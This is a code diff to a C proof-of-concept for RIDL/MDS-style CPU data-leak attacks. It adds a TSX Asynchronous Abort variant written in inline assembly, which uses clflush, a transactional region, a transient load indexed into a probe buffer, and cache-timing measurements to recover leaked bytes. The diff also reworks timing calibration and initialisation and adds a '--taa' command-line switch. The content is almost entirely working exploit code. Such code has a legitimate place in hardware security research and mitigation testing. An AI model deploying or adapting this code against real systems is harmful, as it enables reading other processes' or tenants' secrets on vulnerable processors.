@@ -23,7 +23,7 @@ int fallout_compatible() { return 0; }
 ssize_t page_size;
 jmp_buf buf;
 void *ptr = NULL;
-int cache_hit_timing = 150;
+int cache_hit_timing = 150, use_taa = 0;
 
 #ifdef TSX_AVAILABLE
 static __attribute__((always_inline)) inline unsigned int xbegin(void) {
@@ -119,7 +119,9 @@ static inline int get_cache_timing() {
     uint64_t * page = aligned_alloc(page_size, page_size);
     page[0] = 42;
     asm volatile("mfence");
-    int ret = (int) measure_access_time(page);
+    flush(page);
+    asm volatile("mfence");
+    int ret = (int) measure_access_time(page) / 2;
     free(page);
     return ret;
 }
@@ -143,12 +145,15 @@ int flush_cache(void *mem) {
 }
 
 #ifdef TSX_AVAILABLE
+
+uint8_t* flush_buffer;
+
 static inline __attribute__((always_inline)) void lfb_leak(void* mem, uint8_t* ptr){
     if(xbegin()){maccess(mem + page_size * (*ptr)); xend();}
     //asm volatile("mfence\n");
 }
 
-int lfb_read(void *mem) {
+static inline __attribute__((always_inline)) int lfb_read_basic(void *mem) {
     int i = 0;
     flush_mem(mem);
     lfb_leak(mem, ptr);
@@ -157,6 +162,37 @@ int lfb_read(void *mem) {
         if (t < cache_hit_timing) return i;
     }
     return -1;
+}
+
+static inline __attribute__((always_inline)) void lfb_leak_taa(void* mem, uint8_t* ptr){
+    uint64_t local;
+    asm volatile(
+            "clflush (%0)\n"
+            "sfence\n"
+            "clflush (%1)\n"
+            "xbegin 1f\n"
+            "movq (%0), %2\n"
+            "shlq $0xC, %2\n"
+            "movq (%1, %2), %2\n"
+            "xend\n"
+            "1:\n"
+            ::"r"(ptr), "r"(mem), "r"(local));
+}
+
+static inline __attribute__((always_inline)) int lfb_read_taa(void *mem) {
+    int i = 0;
+    flush_mem(mem);
+    lfb_leak_taa(mem, flush_buffer);
+    for (; i < 256; i++) {
+        uint64_t t = measure_access_time(mem + page_size * i);
+        if (t < cache_hit_timing) return i;
+    }
+    return -1;
+}
+
+int lfb_read(void *mem) {
+    if(!use_taa) return lfb_read_basic(mem);
+    return lfb_read_taa(mem);
 }
 #else
 
@@ -182,16 +218,21 @@ int lfb_read(void *mem) {
 /**
  * Init function, should be called before any other function from this file is used
  */
-int ridl_init() {
+int ridl_init(int argc, char** args) {
+    page_size = getpagesize();
+    cache_hit_timing = get_cache_timing();
 #ifndef TSX_AVAILABLE
     printf("Not using Intel TSX! Setting up signal handler...\n");
     if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
         printf("%s", "Failed to setup signal handler\n");
         return 0;
     }
+#else
+    if(argc > 1){
+        use_taa = !strcmp(args[1], "--taa");
+    }
+    flush_buffer = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
 #endif
-    page_size = getpagesize();
-    cache_hit_timing = get_cache_timing();
     fflush(stdout);
     return 1;
 }
